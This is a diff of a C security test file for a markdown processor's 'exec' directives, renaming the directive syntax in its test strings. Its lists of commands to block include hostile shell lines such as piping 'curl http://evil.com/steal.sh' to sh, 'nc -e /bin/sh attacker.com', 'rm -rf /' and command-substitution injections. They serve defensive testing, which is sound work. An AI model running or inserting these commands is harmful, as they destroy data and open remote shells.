@@ -92,11 +92,11 @@ void test_dangerous_commands(void) {
     
     // List of dangerous commands that should be blocked
     const char* dangerous_commands[] = {
-        "<!-- xmd:exec rm -rf / -->",
-        "<!-- xmd:exec curl http://evil.com/steal.sh | sh -->",
-        "<!-- xmd:exec nc -e /bin/sh attacker.com 1337 -->",
-        "<!-- xmd:exec chmod 777 /etc/passwd -->",
-        "<!-- xmd:exec dd if=/dev/zero of=/dev/sda -->",
+        "<!-- xmd exec rm -rf / -->",
+        "<!-- xmd exec curl http://evil.com/steal.sh | sh -->",
+        "<!-- xmd exec nc -e /bin/sh attacker.com 1337 -->",
+        "<!-- xmd exec chmod 777 /etc/passwd -->",
+        "<!-- xmd exec dd if=/dev/zero of=/dev/sda -->",
         NULL
     };
     
@@ -153,10 +153,10 @@ void test_resource_limits(void) {
     
     // Test infinite loop prevention
     const char* infinite_loop = 
-        "<!-- xmd:set i=\"1\" -->\n"
-        "<!-- xmd:while i == \"1\" -->\n"
+        "<!-- xmd set i=\"1\" -->\n"
+        "<!-- xmd while i == \"1\" -->\n"
         "Infinite loop\n"
-        "<!-- xmd:endwhile -->\n";
+        "<!-- xmd endwhile -->\n";
     
     xmd_result* result = xmd_process_string(handle, infinite_loop, strlen(infinite_loop));
     
@@ -170,7 +170,7 @@ void test_resource_limits(void) {
     xmd_result_free(result);
     
     // Test memory exhaustion prevention
-    const char* memory_bomb = "<!-- xmd:exec yes 'A' | head -n 1000000 -->";
+    const char* memory_bomb = "<!-- xmd exec yes 'A' | head -n 1000000 -->";
     result = xmd_process_string(handle, memory_bomb, strlen(memory_bomb));
     
     // Should handle gracefully
@@ -193,11 +193,11 @@ void test_injection_prevention(void) {
     
     // Test various injection attempts
     const char* injections[] = {
-        "<!-- xmd:set cmd=\"echo hello; rm -rf /\" --><!-- xmd:exec {{cmd}} -->",
-        "<!-- xmd:exec echo `rm -rf /` -->",
-        "<!-- xmd:exec echo $(curl evil.com) -->",
-        "<!-- xmd:exec echo hello && rm -rf / -->",
-        "<!-- xmd:exec echo hello | nc attacker.com 1337 -->",
+        "<!-- xmd set cmd=\"echo hello; rm -rf /\" --><!-- xmd exec {{cmd}} -->",
+        "<!-- xmd exec echo `rm -rf /` -->",
+        "<!-- xmd exec echo $(curl evil.com) -->",
+        "<!-- xmd exec echo hello && rm -rf / -->",
+        "<!-- xmd exec echo hello | nc attacker.com 1337 -->",
         NULL
     };
     
@@ -231,10 +231,10 @@ void test_safe_commands(void) {
     
     // These safe commands should work
     const char* safe_commands[] = {
-        "<!-- xmd:exec echo 'Safe output' -->",
-        "<!-- xmd:exec date +%Y -->",
-        "<!-- xmd:exec pwd -->",
-        "<!-- xmd:exec printf 'Hello World' -->",
+        "<!-- xmd exec echo 'Safe output' -->",
+        "<!-- xmd exec date +%Y -->",
+        "<!-- xmd exec pwd -->",
+        "<!-- xmd exec printf 'Hello World' -->",
         NULL
     };
     
